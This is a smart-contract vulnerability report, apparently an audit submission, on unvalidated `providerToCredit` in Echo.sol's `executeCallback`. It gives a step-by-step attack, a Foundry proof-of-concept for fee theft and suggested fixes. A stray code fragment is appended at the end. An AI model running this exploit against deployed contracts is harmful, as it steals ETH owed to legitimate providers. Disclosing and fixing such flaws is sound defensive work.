### Title
Unvalidated `providerToCredit` in `executeCallback` Allows Fee Theft After Exclusivity Period - (File: target_chains/ethereum/contracts/contracts/echo/Echo.sol)

### Summary
`Echo.executeCallback` accepts a caller-supplied `providerToCredit` address and credits the entire request fee to that address. During the exclusivity window the contract enforces `providerToCredit == req.provider`, but once the exclusivity period expires **no validation is performed on `providerToCredit`**. Any unprivileged caller can register as a provider, wait for the exclusivity period to lapse, then call `executeCallback` with their own address as `providerToCredit`, stealing the fee that should have gone to the legitimate provider.

### Finding Description
In `Echo.sol`, `executeCallback` takes `providerToCredit` as a caller-controlled parameter:

```solidity
function executeCallback(
    address providerToCredit,
    uint64 sequenceNumber,
    bytes[] calldata updateData,
    bytes32[] calldata priceIds
) external payable override {
    Request storage req = findActiveRequest(sequenceNumber);

    // Check provider exclusivity using configurable period
    if (
        block.timestamp < req.publishTime + _state.exclusivityPeriodSeconds
    ) {
        require(
            providerToCredit == req.provider,
            "Only assigned provider during exclusivity period"
        );
    }
    // ... price validation ...

    _state.providers[providerToCredit].accruedFeesInWei += SafeCast
        .toUint128((req.fee + msg.value) - pythFee);   // ← credited to arbitrary address
``` [1](#0-0) 

Once `block.timestamp >= req.publishTime + exclusivityPeriodSeconds`, the `require` block is skipped entirely. The fee accounting line on line 161 then credits `_state.providers[providerToCredit].accruedFeesInWei` with the full provider fee, where `providerToCredit` is an **unvalidated, attacker-supplied value**.

The fee stored in the request is set at request time as `req.fee = msg.value - pythFeeInWei`, representing the full provider compensation: [2](#0-1) 

Withdrawal is gated by the fee manager role:

```solidity
function withdrawAsFeeManager(address provider, uint128 amount) external override {
    require(msg.sender == _state.providers[provider].feeManager, "Only fee manager");
    ...
    (bool sent, ) = msg.sender.call{value: amount}("");
``` [3](#0-2) 

An attacker can become their own fee manager by first calling `registerProvider` (permissionless) and then `setFeeManager(attackerAddress)`: [4](#0-3) 

### Impact Explanation
An unprivileged attacker can steal 100% of the provider fee for any request whose exclusivity period has elapsed. The stolen funds are real ETH locked in the contract and owed to the legitimate provider. The legitimate provider receives zero compensation for fulfilling the request (or the attacker can also fulfill the callback themselves, collecting both the fee and the callback execution).

### Likelihood Explanation
The exclusivity period is a configurable `uint32` (seconds). Any pending unfulfilled request that ages past `req.publishTime + exclusivityPeriodSeconds` is vulnerable. The attack requires only:
1. Calling `registerProvider(0, 0, 0)` — permissionless, zero cost.
2. Calling `setFeeManager(attackerAddress)` — permissionless.
3. Monitoring on-chain for requests past their exclusivity window.
4. Calling `executeCallback(attackerAddress, sequenceNumber, ...)`.
5. Calling `withdrawAsFeeManager(attackerAddress, amount)`.

No privileged access, leaked keys, or external oracle manipulation is required. Any on-chain observer can execute this.

### Recommendation
After the exclusivity period, validate that `providerToCredit` is a registered provider. The simplest fix is to add:

```solidity
require(
    _state.providers[providerToCredit].isRegistered,
    "providerToCredit must be a registered provider"
);
```

Alternatively, use `msg.sender` as the credited address (analogous to the original AAVE fix: replace the wrong address with the correct one), so the caller who actually performs the work receives the fee:

```solidity
_state.providers[msg.sender].accruedFeesInWei += SafeCast.toUint128((req.fee + msg.value) - pythFee);
```

This mirrors the fix pattern from the referenced AAVE report: replace the wrong/unvalidated address with the correct one.

### Proof of Concept
```solidity
// 1. Attacker registers as a provider (zero fees, permissionless)
vm.prank(attacker);
echo.registerProvider(0, 0, 0);

// 2. Attacker sets themselves as fee manager
vm.prank(attacker);
echo.setFeeManager(attacker);

// 3. Legitimate user makes a request to defaultProvider
vm.deal(user, totalFee);
vm.prank(user);
uint64 seq = echo.requestPriceUpdatesWithCallback{value: totalFee}(
    defaultProvider, block.timestamp, priceIds, callbackGasLimit
);

// 4. Wait for exclusivity period to expire
vm.warp(block.timestamp + echo.getExclusivityPeriod() + 1);

// 5. Attacker calls executeCallback crediting themselves
vm.prank(attacker);
echo.executeCallback(attacker, seq, updateData, priceIds);

// 6. Attacker withdraws stolen fees
uint128 stolen = echo.getProviderInfo(attacker).accruedFeesInWei;
vm.prank(attacker);
echo.withdrawAsFeeManager(attacker, stolen);

// defaultProvider received 0; attacker received the full provider fee
assertEq(echo.getProviderInfo(defaultProvider).accruedFeesInWei, 0);
assertEq(attacker.balance, stolen); // attacker holds stolen funds
```

    function withdrawAsFeeManager(
        address provider,
        uint128 amount
    ) external override {
        require(
            msg.sender == _state.providers[provider].feeManager,
            "Only fee manager"
        );
        require(
            _state.providers[provider].accruedFeesInWei >= amount,
            "Insufficient balance"
        );

        _state.providers[provider].accruedFeesInWei -= amount;

        (bool sent, ) = msg.sender.call{value: amount}("");
        require(sent, "Failed to send fees");

        emit FeesWithdrawn(msg.sender, amount);
